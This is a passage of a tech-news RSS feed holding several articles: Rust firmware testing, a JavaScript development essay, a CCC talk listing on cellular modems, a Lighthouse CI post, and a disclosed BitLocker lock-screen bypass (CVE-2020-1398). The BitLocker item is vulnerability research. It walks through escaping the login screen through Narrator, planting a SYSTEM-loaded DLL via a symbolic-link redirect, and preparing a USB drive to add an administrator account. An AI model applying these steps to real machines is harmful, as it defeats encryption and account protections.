</code></pre></div><p>I used the toolchain that comes with NCS v1.4.1. I did have to make a change to the Makefile for everything to compile without borking. Turns out my toolchain was newer than expected. Fortunately adding <code>Wno-deprecated</code> inside the Makefile to the <code>WFLAGS</code> variable fixes this problem.</p></li><li><p>Once complete it will dump your binary/hex files to <code>build/&lt;your board name&gt;</code></p></li><li><p>Then I flashed the bootloader using <code>pyocd</code> like so:</p><div><pre><code data-lang="bash">pyocd flash -t ATSAMD21J18A -f <span>4000000</span> bootloader-circuitdojo_feather_tester-v3.4.0-65-gdf89a1f-dirty.elf --format elf
</code></pre></div><p><code>pyocd</code> is just one of many ways to load firmware. The <a href="https://github.com/atsamd-rs/atsamd" target="_blank"><code>atsamd-rs</code> repo</a> has a ton more options.</p></li></ol><p>Once programmed, hit the reset button twice in quick succession to enable bootloader mode. (I believe this is consistent across all other boards using the UF2 bootloader. Correct me if i‚Äôm wrong!) This will cause the bootloader to remain active so you can transfer new firmware.</p><p>On a scale from easy to painful, this was defintiely on the easy side of the spectrum. The folks at Microsoft and contributors like Adafruit made this process <em>really simple.</em></p><h3 id="hey-my-name-is-hal">Hey, my name is HAL</h3><p><img alt="Compiling Rust firmware" src="https://www.jaredwolff.com/testing-hardware-using-rust/images/Screen_Shot_2021-01-10_at_12.37.34_PM.png" data-src="images/Screen_Shot_2021-01-10_at_12.37.34_PM.png"></p><p>As of this writing, every different hardware platform has some type of independently created HAL (hardware abstraction layer). Atmel‚Äôs SAMD differs slightly from nRF and that differs from the STM32s of the world. The nice thing is as long as they conform to the higher level APIs, you can use something like the <a href="https://github.com/mvirkkunen/usb-device" target="_blank">USB crate</a> which supports ATSAMD and STM32.</p><p>The fastest way to get started with your own ATSAMD based board to create your own board definition. You can find a <strong>ton</strong> of example in the <code>boards</code> directory. Many off the shelf boards are already supported which makes for one less thing you need to do!</p><p>If you do find yourself with a custom board, you can copy one of the already existing boards that is closest to yours. For instance I used <code>feather_m0</code> as the base for my tester board. I tweaked <code>memory.x</code> and <code>src/lib.rs</code> to my liking.</p><p>There‚Äôs even a cool way to define pins so you can easily access them later. For for instance if you have a pin named <code>FLASH_EN</code> and it‚Äôs mapped to pin port B, pin 8 you can simply reference it later on using the <code>Pins</code> struct like <code>pins.flash_en</code>. (More below..)</p><p>The ATSAMD repo is going through some slow and steady improvements. There are even some nice additions to the <a href="https://github.com/atsamd-rs/atsamd/pull/371" target="_blank">board support</a> area that i‚Äôm excited about and testing. While it‚Äôs mostly useable, it is rough in some areas (especially related to documentation).</p><p><em>Big shoutout to Bradley who has been spearheading these improvements. If I were to do any of this, i‚Äôd be surprised it would be working by then of it.</em> üòÖ</p><h3 id="dont-be-unsafe">Don‚Äôt be <code>unsafe</code></h3><p>When I first started developing the test firmware, I notice that I was using <code>unsafe</code> a lot. While in hardwareland using <code>unsafe</code> is not uncommon, from a readability and risk for increased errors perspective, it can get hairy.</p><p>There is a cool solution around this and that‚Äôs where <code>rtic</code> enters the picture. <code>rtic</code> is a new spin on how to write firmware in Rust. Instead of having the familiar <code>main</code> function, it works differently. Here‚Äôs the features from <a href="https://github.com/rtic-rs/cortex-m-rtic" target="_blank">the Github page</a>:</p><ul><li><strong>Tasks</strong>&nbsp;as the unit of concurrency [^1]. Tasks can be&nbsp;<em>event triggered</em>&nbsp;(fired in response to asynchronous stimuli) or spawned by the application on demand.</li><li><strong>Message passing</strong>&nbsp;between tasks. Specifically, messages can be passed to software tasks at spawn time.</li><li><strong>A timer queue</strong>&nbsp;[^2]. Software tasks can be scheduled to run at some time in the future. This feature can be used to implement periodic tasks.</li><li>Support for prioritization of tasks and, thus,&nbsp;<strong>preemptive multitasking</strong>.</li><li><strong>Efficient and data race free memory sharing</strong>&nbsp;through fine grained&nbsp;<em>priority based</em>&nbsp;critical sections [^1].</li><li><strong>Deadlock free execution</strong>&nbsp;guaranteed at compile time. This is an stronger guarantee than what‚Äôs provided by&nbsp;<a href="https://doc.rust-lang.org/std/sync/struct.Mutex.html" target="_blank">the standard&nbsp;<code>Mutex</code>abstraction</a>.</li><li><strong>Minimal scheduling overhead</strong>. The task scheduler has minimal software footprint; the hardware does the bulk of the scheduling.</li><li><strong>Highly efficient memory usage</strong>: All the tasks share a single call stack and there‚Äôs no hard dependency on a dynamic memory allocator.</li><li><strong>All Cortex-M devices are fully supported</strong>.</li><li>This task model is amenable to known WCET (Worst Case Execution Time) analysis and scheduling analysis techniques. (Though we haven‚Äôt yet developed Rust friendly tooling for that.)</li></ul><p>While all these features and capabilities seem great, so what gives?</p><p>Well, for starters there‚Äôs no <code>main</code> function. üôÄ</p><p>Here‚Äôs what a basic blinky app looks like using some of the new BSP (Board support packages) I mentioned earlier:</p><div><pre><code data-lang="rust"><span>#![deny(unsafe_code)]</span>
<span>#![no_main]</span>
<span>#![no_std]</span>

<span>extern</span> <span>crate</span> circuitdojo_tester <span>as</span> hal;
<span>use</span> panic_halt <span>as</span> _;

<span>use</span> hal::clock::GenericClockController;

<span>use</span> hal::delay::Delay;
<span>use</span> hal::prelude::<span>*</span>;
<span>use</span> hal::Pins;

<span>#[rtic::app(device = hal::pac, peripherals = true)]</span>
<span>const</span> APP: () <span>=</span> {
    <span>struct</span> <span>Resources</span> {
        led_pass: <span>hal</span>::LedPass,
        delay: <span>Delay</span>,
    }
    <span>#[init()]</span>
    <span>fn</span> <span>init</span>(cx: <span>init</span>::Context) -&gt; <span>init</span>::LateResources {
        <span>let</span> <span>mut</span> peripherals <span>=</span> cx.device;
        <span>let</span> <span>mut</span> clocks <span>=</span> GenericClockController::with_external_32kosc(
            peripherals.GCLK,
            <span>&amp;</span><span>mut</span> peripherals.PM,
            <span>&amp;</span><span>mut</span> peripherals.SYSCTRL,
            <span>&amp;</span><span>mut</span> peripherals.NVMCTRL,
        );
        <span>let</span> pins <span>=</span> Pins::new(peripherals.PORT);
        <span>let</span> led_pass <span>=</span> pins.led_pass.into_push_pull_output();

        <span>let</span> delay <span>=</span> Delay::new(cx.core.SYST, <span>&amp;</span><span>mut</span> clocks);

        init::LateResources { led_pass, delay }
    }
    <span>#[idle(resources=[led_pass, delay]</span>)]
    <span>fn</span> <span>idle</span>(cx: <span>idle</span>::Context) -&gt; <span>!</span> {
        <span>loop</span> {
            <span>let</span> _ <span>=</span> cx.resources.led_pass.toggle();
            cx.resources.delay.delay_ms(<span>500</span><span>u32</span>);
        }
    }
};
</code></pre></div><p>The <code>init</code> function is where you would normally put anything you‚Äôd normally put in an Arduino <code>setup</code> function. We‚Äôre setting up pins and peripherals. If you want to use them later on though, you‚Äôll need to create an entry in <code>Resources</code>. This is also where you store any type of static mutable data structures that you need elsewhere in your firmware.</p><p>The <code>idle</code> function is similar to the <code>loop</code> function in Arduino. It‚Äôs important though that if you want a loop, you have to implement it. Here‚Äôs the warning in the <a href="https://rtic.rs/0.5/book/en/by-example/app.html?highlight=loop#idle" target="_blank"><code>rtic</code> documentation</a>:</p><blockquote><p>Unlike init, idle will run with interrupts enabled and it‚Äôs not allowed to return so it must run forever.</p></blockquote><p>You don‚Äôt <strong>need</strong> to use an <code>idle</code> function though. If you don‚Äôt, your microcontroller will go to sleep. This is ideal for battery powered applications that need to sleep as much as possible.</p><p>In <code>rtic</code> every work function gets a <code>Context</code> variable. It allow you to access resources that are pertinent to that function‚Äôs purpose. Access is only granted though when you add a resource like below:</p><div><pre><code data-lang="rust"><span>#[idle(resources=[led_pass, delay]</span>)]
</code></pre></div><p>If <code>resources</code> was not set like above, I would not be able to use <code>led_pass</code> or <code>delay</code> within the function!</p><p>While this is a simple example, when you start using static resources like fixed size vectors you‚Äôll be happy you chose to use <code>rtic</code>. The <a href="https://github.com/japaric/heapless" target="_blank"><code>heapless</code></a> crate has been extremely useful for setting size contrained elements that you‚Äôd normally be able to use with Rust‚Äôs <code>std</code> lib.</p><p>While <code>heapless</code> implements a few very handy types, the <code>Vec</code> and <code>spsc</code> imlementation have been <em>extremely</em> useful. If you‚Äôre looking for <code>std</code> conventions for embedded, no need to look further. Get started with <code>heapless</code> with their great documentation <a href="https://japaric.github.io/heapless/heapless/index.html" target="_blank">here</a>.</p><h3 id="the-confusion-ensues">The confusion ensues</h3><p>One thing that may be confusing ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jaredwolff.com/testing-hardware-using-rust/">https://www.jaredwolff.com/testing-hardware-using-rust/</a></em></p>]]>
            </description>
            <link>https://www.jaredwolff.com/testing-hardware-using-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809208</guid>
            <pubDate>Sun, 17 Jan 2021 08:43:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I build JavaScript apps in 2021]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809132">thread link</a>) | @timdaub
<br/>
January 17, 2021 | https://timdaub.github.io/2021/01/16/web-principles/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2021/01/16/web-principles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>It's now roughly seven or eight years that I'm building dynamic front ends for the web. From <a target="_blank" rel="noopener" href="https://www.ascribe.io/">digital art wallets</a> to games (<a target="_blank" rel="noopener" href="https://ipfs.leapdao.org/blog/Planet-A-ccc-ethberlin-recap/">1</a>, <a href="https://timdaub.github.io/videogame">2</a>) and <a href="https://timdaub.github.io/wasm-synth">synthesizers</a>, I've seen it all. And since my process of creation has dramatically changed over the years, today, I'd like to share how I'm developing web apps in 2021.</p>
<h2 id="i-avoid-build-processes.">I avoid build processes.</h2>
<p>I still remember the debates with colleagues about using <a target="_blank" rel="noopener" href="https://babeljs.io/">babel</a> a few years ago. Within the front end development world, transpiling had just become a thing, so we ended up babelifying our builds to use ES6. Our argument back then was that one day, we would be able to push our application's directory structure on a web server and since all browsers would then support the augmented ES6 features, our app would just work! Without a build process. WOW! That must have been around 2015. When I look at the source code of these old applications now, our technical visions didn't end up becoming reality.</p>
<p>Now, I try to keep my build process to a minimum. When I need to write a demo app, I particularly like using <a target="_blank" rel="noopener" href="https://babeljs.io/docs/en/babel-standalone#script-tags"><code>&lt;script type="text/babel"&gt;</code></a>. I love <a target="_blank" rel="noopener" href="https://preactjs.com/guide/v10/getting-started/#no-build-tools-route">preact's "no build tools route."</a> too. When I have to set up an actual app, I avoid <a target="_blank" rel="noopener" href="https://webpack.js.org/">webpack</a> and <a target="_blank" rel="noopener" href="https://rollupjs.org/">rollup</a>. I mainly get frustrated about the myriad ways of configuring them. Some minor thing always ends up being broken, which leads to hours of debugging foreign code. And that's frustrating. Using preact's no build route, finally something like the above is possible:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>&lt;script type=<span>"module"</span>&gt;</span><br><span>  </span><br><span>  <span>import</span> { h, Component, render } <span>from</span> <span>'https://unpkg.com/preact?module'</span>;</span><br><span>  <span>const</span> app = h(<span>'h1'</span>, <span>null</span>, <span>'Hello World!'</span>);</span><br><span>  render(app, <span>document</span>.body);</span><br><span>&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>When having to use a build tool, I gravitate towards <a target="_blank" rel="noopener" href="https://parceljs.org/">parcel</a> or <a target="_blank" rel="noopener" href="https://github.com/developit/microbundle">microbundle</a> as they come preconfigured. And in particular, parcel is excellent, as it's merely using an HTML file as its entry point. To me, that's promising as it assumes a proper directory structure and properly connected files such that maybe one day I can push my app to the web without that build step.</p>
<h2 id="i-avoid-transpiling.">I avoid transpiling.</h2>
<p>For the same reasons as pointed out above, I also try to avoid transpiling. It's not because I don't like ESNext features, but more because I want to minimize the risk of getting stuck with the transpiler. Hence, I try to avoid using babel. <a href="https://timdaub.github.io/2020/09/01/typescript/">I also don't use Typescript</a>. To me, JavaScript is productive enough. Additionally, for <a target="_blank" rel="noopener" href="https://reactjs.org/">react</a>-style projects, no transpilers mean I stopped using <a target="_blank" rel="noopener" href="https://reactjs.org/docs/introducing-jsx.html">JSX</a>. Instead, I found an excellent library called <a target="_blank" rel="noopener" href="https://github.com/developit/htm">htm</a> that uses JavaScript's template strings. It has a similar syntax to JSX, but it's not breaking ECMAScript standards and hence needs no transpliation.</p>
<h2 id="i-avoid-the-new-and-shiny.">I avoid the <em>new</em> and <em>shiny</em>.</h2>
<p>I even avoid changing the way I work if I don't feel comfortable or inclined. For example, I never switched to <a target="_blank" rel="noopener" href="https://reactjs.org/docs/hooks-intro.html">react hooks</a>. The <a target="_blank" rel="noopener" href="https://reactjs.org/docs/state-and-lifecycle.html">lifecycle methods</a> that I initially know from iOS Objective-C programming are - in my opinion - a beautiful metaphor for writing front end components. And neither did I have any issues with my sites' performance. I would make the switch if I started to have problems. But I don't. The same goes for up and coming frameworks. Angular V2? <a target="_blank" rel="noopener" href="https://svelte.dev/">Svelte</a>? Cool, but why relearn a framework when I'm already productive with the one I use?</p>
<h2 id="i-test-everything.">I test EvErYtHiNg.</h2>
<p>When I started front-end development, testing was complicated. Only a few front end developer colleagues tested their apps properly. I ended up doing a lot of testing by hand. It was frustrating and unproductive. But testing front ends has improved dramatically over the years. Not only have the tools been significantly enhanced.</p>
<p>We, as front-end developers, have now also figured out how to correctly write front end tests. Finally, we're able to distinguish between functional code and presentational code. For functional code, we now write unit tests. For presentational code, we use snapshot-based testing and integration tests. I'm pleased about tools like <a target="_blank" rel="noopener" href="https://www.cypress.io/">cypress</a> that is great for integration tests. I also like <a target="_blank" rel="noopener" href="https://github.com/avajs/ava/">ava</a> for unit tests.</p>
<h2 id="i-optimize-for-performance-and-quality.">I optimize for performance and quality.</h2>
<p>I used to be eager about building extensively functional software: the more features, the better. I'm not anymore. Instead, I try to develop software that works well for my users. I strive for quality. So I try to measure my build's size. I take proper care about delivering my application, meaning I turn on compression and <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching">caching</a>. I care about optimizing my static assets like pictures. And I like to check my apps by using tools like <a target="_blank" rel="noopener" href="https://developers.google.com/speed/pagespeed/insights/?hl=de">PageSpeed Insights</a> or <a target="_blank" rel="noopener" href="https://developers.google.com/web/tools/lighthouse">lighthouse</a>.</p>
<h2 id="i-use-my-own-work">I use my own work</h2>
<p>From experience, I learned that I hardly ever get stuck on a algorithmic problem. On the contrary, I get motivated to learn something new and excel in the process. However, I caught my self often spending many hours on debugging other people's code. Mainly when it's third-party libraries that I included via npm. Once, I thought that using npm packages was a JavaScript developer's superpower. Now, I know that it can also be their curse.</p>
<p>Instead of collecting heaps of third-party code, I now prefer following <a target="_blank" rel="noopener" href="http://hintjens.com/blog:96">Peter Hintjens' principles for writing good code</a>. I "use my own work." Meaning, I dare to write seemingly complex code myself. I still won't roll my own crypto or write a date library, but I dare to implement parts of a protocol or build an algorithm. It's not to say that I ditch every npm package and go npm-keto-diet. No, instead, I take a more mindful approach towards dependencies and only include them when I truly need them.</p>
<p>I try to do that by leaving my technical vision at the doorstep of my office, so that I can now focus on solving the problems at hand. I try to stop worrying about eventualities far in the future as I view that as speculation. In cases I have past experiences, I use it to form my decision. For unchartered teritory, I move carefully, step by step.</p>
<h2 id="i-use-open-source-to-my-advantage.">I use open source to my advantage.</h2>
<p>I'm building websites since I'm a teenager. And had I open-sourced and maintained a few pieces of code that I need frequently, I'd be more productive now. Unfortunately, I was short-sighted. Surprisingly, I didn't think about still using JavaScript at 29 years of age üòÇ</p>
<p>I stopped framing open source mainly around certain virtues like free speech, fairness or certain politics. They're still important virtues for me, but I learned that I could use open source also for building a personal toolset.</p>
<p>Extracting a library from a codebase allows me to think about it from a user's perspective. It means I'm able to think about a piece of code's interfaces emphatically. Additionally, there's positive peer pressure. I'm not going to release shit to the world. When my project is public, it's going to have a proper README and some docs. And it's going to be tested. Since everybody can see it, I might as well create something I can be proud of.</p>
<p>Hence, contributing to open source, for me, is about building high-quality software. Being anxious about not being able to monetize this particular piece of code has become less of a concern. <a target="_blank" rel="noopener" href="https://github.com/sindresorhus">sindresohrus</a> inspired me to treat open source packages like my personal toolbox.</p>
<h2 id="conclusion">Conclusion</h2>
<p>And that's my incomplete list of principles. I'm sure there's more than just these. Anyway, I still find some of these points quite controversial. I'm sure they won't work for everyone as all our contexts differ. But working solo as a freelancer, I've found that these principles contribute to me being content about what I'm doing. Hence, I was eager to share them.</p>
<p>I'm curious to hear other's thoughts and see if they've taken similar paths. Please reach out! Also, don't forget to subscribe to my newsletter!</p>

  </div></div>]]>
            </description>
            <link>https://timdaub.github.io/2021/01/16/web-principles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809132</guid>
            <pubDate>Sun, 17 Jan 2021 08:23:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BitLocker Lockscreen Bypass]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25808059">thread link</a>) | @notRobot
<br/>
January 16, 2021 | https://secret.club/2021/01/15/bitlocker-bypass.html | <a href="https://web.archive.org/web/*/https://secret.club/2021/01/15/bitlocker-bypass.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>BitLocker is a modern data protection feature that is deeply integrated in the Windows kernel. It is used by many corporations as a means of protecting company secrets in case of theft. Microsoft recommends that you have a Trusted Platform Module which can do some of the heavy cryptographic lifting for you.</p><p>Given a Windows 10 system without known passwords and a BitLocker-protected hard drive, an administrator account could be adding by doing the following:</p><ul><li>At the sign-in screen, select ‚ÄúI have forgotten my password.‚Äù</li><li>Bypass the lock and enable autoplay of removable drives.</li><li>Insert a USB stick with my .exe and a junction folder.</li><li>Run executable.</li><li>Remove the thumb drive and put it back in again, go to the main screen.</li><li>From there launch narrator, that will execute a DLL payload planted earlier.</li></ul><p>Now a user account is added called hax with password ‚Äúhax‚Äù with membership in Administrators. To update the list with accounts to log into, click <em>I forgot my password</em> and then return to the main screen.</p><h2 id="bypassing-the-lock-screen"> <a href="#bypassing-the-lock-screen">Bypassing the lock screen</a></h2><p>First, we select the ‚ÄúI have forgotten my password/PIN‚Äù option. This option launches an additional session, with an account that gets created/deleted as needed; the user profile service calls it a default-account. It will have the first available name of defaultuser1, defaultuser100000, defaultuser100001, etc.</p><p>To escape the lock, we have to use the Narrator because if we manage to launch something, we cannot see it, but using the Narrator, we will be able to navigate it. However, how do we launch something?</p><p><img src="https://secret.club/assets/bitlockerbypass/1.png" alt=""></p><p>If we smash shift 5 times in quick succession, a link to open the Settings app appears, and the link actually works. We cannot see the launched Settings app. Giving the launched app focus is slightly tricky; you have to click the link and then click a place where the launched app would be visible with the correct timing. The easiest way to learn to do it is, keep clicking the link roughly 2 times a second. The sticky keys windows will disappear. Keep clicking! You will now see a focus box is drawn in the middle of the screen. That was the Settings app, and you have to stop clicking when it gets focus.</p><p>Now we can navigate the Settings app using CapsLock + Left Arrow, press that until we reach Home. Now, when Home has focus, hold down Caps Lock and press Enter. Using CapsLock + Right Arrow navigate to Devices and CapsLock + Enter when it is in focus.</p><p><img src="https://secret.club/assets/bitlockerbypass/2.png" alt=""></p><p>Now navigate to AutoPlay, CapsLock + Enter and choose ‚ÄúOpen Folder to view files (File Explorer).‚Äù Now insert the prepared USB drive, wait some seconds, the Narrator will announce the drive has been opened, and the window is focused. Now select the file <strong>Exploit.exe</strong> and execute it with CapsLock + Enter. That is arbitrary code execution, ladies and gentlemen, without using any passwords. However, we are limited by running as the default profile.</p><p>I have made a video with my phone, as I cannot take screenshots.</p><iframe width="560" height="315" src="https://www.youtube.com/embed/ZdsSgklRoag" frameborder="0" allowfullscreen=""></iframe><h2 id="elevation-of-privilege"> <a href="#elevation-of-privilege">Elevation of privilege</a></h2><p>When a USB stick is mounted, BitLocker will create a directory named ClientRecoveryPasswordRotation in System Volume Information and set permissions to:</p><div><div><pre><code>NT AUTHORITY\Authenticated Users:(F)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
</code></pre></div></div><p>To redirect the create operation, a symbolic link in the NT namespace is needed as that allows us to control the filename, and the existence of the link does not abort the operation as it is still creating the directory.</p><p>Therefore, take a USB drive and make <code>\System Volume Information</code> a mount point targeting <code>\RPC Control</code>. Then make a symbolic link in <code>\RPC Control\ClientRecoveryPasswordRotation</code> targetting <code>\??\C:\windows\system32\Narrator.exe.local</code>. If the USB stick is reinserted then the folder <code>C:\windows\system32\Narrator.exe.local</code> will be created with permissions that allows us to create a subdirectory:</p><div><div><pre><code>amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.657_none_e6c5b579130e3898
</code></pre></div></div><p>Inside this subdirectory, we drop a payload DLL named <em>comctl32.dll</em>. Next time the Narrator is triggered, it will load the DLL. By the way, I chose the Narrator as that is triggerable from the login screen as a system service and is not auto-loaded, so if anything goes wrong, we can still boot.</p><h2 id="combining-them"> <a href="#combining-them">Combining them</a></h2><p>The <code>ClientRecoveryPasswordRotation</code> exploit to work requires a symbolic link in <code>\RPC Control</code>. The executable on the USB drive creates the link using two calls to <code>DefineDosDevice</code>, making the link permanent so they can survive a logout/in if needed.</p><p>Then a loop is started in which the executable will:</p><ul><li>Try to create the subdirectory.</li><li>Plant the payload <code>comctl32.dll</code> inside it.</li></ul><p>It is easy to see when the loop is running because the Narrator will move its focus box and say ‚Äúaccess denied‚Äù every second. We can now use the link created in <code>RPC Control</code>. Unplug the USB stick and reinsert it. The writeable directory will be created in <code>System32</code>; on the next loop iteration, the payload will get planted, and exploit.exe will exit. To test if the exploit has been successful, close the Narrator and try to start it again.</p><p>If the narrator does not work, it is because the DLL is planted, and Narrator executes it, but it fails to add an account because it is launched as <code>defaultuser1</code>. When the payload is planted, you will need to click back to the login screen and start Narrator; 3 beeps should play, and a message box saying the DLL has been loaded as <code>SYSTEM</code> should show. Great! The account has been created, but it is not in the list. Press ‚ÄúI forgot my password‚Äù and click back to update the list.</p><p>A new account named hax should appear, with password hax.</p><p>I used these steps to arm the USB device</p><div><div><pre><code>C:\Users\jonas&gt;format D: /fs:ntfs /q
Insert new disk for drive D:
Press ENTER when ready...
-----
File System: NTFS.
Quick Formatting 30.0 GB
Volume label (32 characters, ENTER for none)?
Creating file system structures.
Format complete.
30.0 GB total disk space.
30.0 GB are available.
</code></pre></div></div><p>Now, we need to elevate to admin to delete <code>System Volume Information</code>.</p><div><div><pre><code>C:\Users\jonas&gt;d:
D:\&gt;takeown /F "System Volume Information"
</code></pre></div></div><p>This results in</p><div><div><pre><code>SUCCESS: The file (or folder): "D:\System Volume Information" now owned by user "DESKTOP-LTJEFST\jonas".
</code></pre></div></div><p>We can then</p><div><div><pre><code>D:\&gt;icacls "System Volume Information" /grant Everyone:(F)
Processed file: System Volume Information
Successfully processed 1 files; Failed processing 0 files
D:\&gt;rmdir /s /q "System Volume Information"
</code></pre></div></div><p>We will use James Forshaw‚Äôs tool (attached) to create the mount point.</p><div><div><pre><code>D:\&gt;createmountpoint "System Volume Information" "\RPC Control"
</code></pre></div></div><p>Then copy the attached exploit.exe to it.</p><div><div><pre><code>D:\&gt;copy c:\Users\jonas\source\repos\exploitKit\x64\Release\exploit.exe .
1 file(s) copied.
</code></pre></div></div><p>I disclosed this vulnerability and it was assigned CVE-2020-1398. Its patch can be found <a href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-1398">here</a></p></div></div>]]>
            </description>
            <link>https://secret.club/2021/01/15/bitlocker-bypass.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25808059</guid>
            <pubDate>Sun, 17 Jan 2021 04:16:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dissecting modern (3G/4G) cellular modems (2016)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807836">thread link</a>) | @pabs3
<br/>
January 16, 2021 | https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=LaForge">LaForge</a> and
<a href="https://media.ccc.de/search?p=holger">holger</a>

</p>
<p>
Playlists:
<a href="https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems/playlist">'33c3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems/audio">audio</a>
/
<a href="https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems/related">related events</a></p>
<!-- %h3 About -->
<p>Let's have a detailed look at some modern 3G/4G cellular modems and see what we can find out about their internals using undocumented debug interfaces and software or hardware based hacking techniques.</p>

<h3>Download</h3>
<div>
<div>

<div>

<div>
<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
</div>
</div>


</div>

</div>
<h3>Related</h3>


<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807836</guid>
            <pubDate>Sun, 17 Jan 2021 03:32:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lighthouse Reports as GitHub Comment]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807724">thread link</a>) | @bleonard
<br/>
January 16, 2021 | https://www.grouparoo.com/blog/lighthouse-reports-on-github | <a href="https://web.archive.org/web/*/https://www.grouparoo.com/blog/lighthouse-reports-on-github">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blogContent"><div><p>Performance is an important factor for user satisfaction, conversion and SEO. <a href="https://github.com/GoogleChrome/lighthouse" target="_blank" rel="nofollow noopener noreferrer">Lighthouse</a> is a tool that creates a report on performance and other best practices. Most commonly, it used from the <a href="https://chrome.google.com/webstore/detail/lighthouse/blipmdconlkpinefehnmjammfjpmpbjk" target="_blank" rel="nofollow noopener noreferrer">chrome extension</a>.</p><div><p><img height="271" width="519" alt="Lighthouse Chrome extension" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/chrome-extension.png"></p></div><p>However, you can also run this test locally. The <code>@lhci/cli</code> library, when installed, provides the following command line tool.</p><pre><code><span>&gt;</span> next build
info  - Creating an optimized production build
info  - Compiled successfully
info  - Collecting page data
info  - Generating static pages <span>(</span><span>123</span>/123<span>)</span>
info  - Finalizing page optimization
<span>..</span>.

<span>&gt;</span> lhci autorun
‚úÖ  .lighthouseci/ directory writable
‚úÖ  Configuration <span>file</span> found
‚úÖ  Chrome installation found
Healthcheck passed<span>!</span>

Started a web server with <span>"PORT=54321 npm start"</span><span>..</span>.
Running Lighthouse <span>1</span> time<span>(</span>s<span>)</span> on http://localhost:54321/about
Run 
<span>..</span>.
Done running Lighthouse<span>!</span>

Uploading median LHR of http://localhost:54321/about<span>..</span>.success<span>!</span>
Open the report at https://storage.googleapis.com/lighthouse-infrastructure.appspot.com/reports/1610848080418-24331.report.html
<span>..</span>.

Done running autorun.
</code></pre><p>This will run for all the URLs that you tell it, launching a headless chrome browser one or more times for each to generate a report.</p><div><p><img height="180" width="519" alt="Lighthouse report from local run" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/local-report.png"></p></div><p>I have also noticed that the numbers (performance) on <code>localhost</code> are slower than on our production site. This is likely because the production site takes advantage of a CDN and other caching features. For example, the 84 score above on the <code>/about</code> page is a 96 on production. However, the local numbers correlate with the production ones.</p><h2>Configuration</h2><p>To make <code>lhci autorun</code> work how you want it, you'll need some configuration in the <code>lighthouserc.js</code> file. Ours exports this:</p><pre><code>module<span>.</span><span>exports</span> <span>=</span> <span>{</span>
  ci<span>:</span> <span>{</span>
    collect<span>:</span> <span>{</span>
      numberOfRuns<span>:</span> <span>1</span><span>,</span>
      url<span>:</span> urls<span>,</span>
      startServerCommand<span>:</span> <span>"PORT=54321 npm start"</span><span>,</span>
      settings<span>:</span> <span>{</span>
        onlyCategories<span>:</span> <span>[</span>
          <span>"performance"</span><span>,</span>
          <span>"best-practices"</span><span>,</span>
          <span>"accessibility"</span><span>,</span>
          <span>"seo"</span><span>,</span>
        <span>]</span><span>,</span> 
        skipAudits<span>:</span> <span>[</span>
          <span>"canonical"</span><span>,</span> 
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
    upload<span>:</span> <span>{</span>
      target<span>:</span> <span>"temporary-public-storage"</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
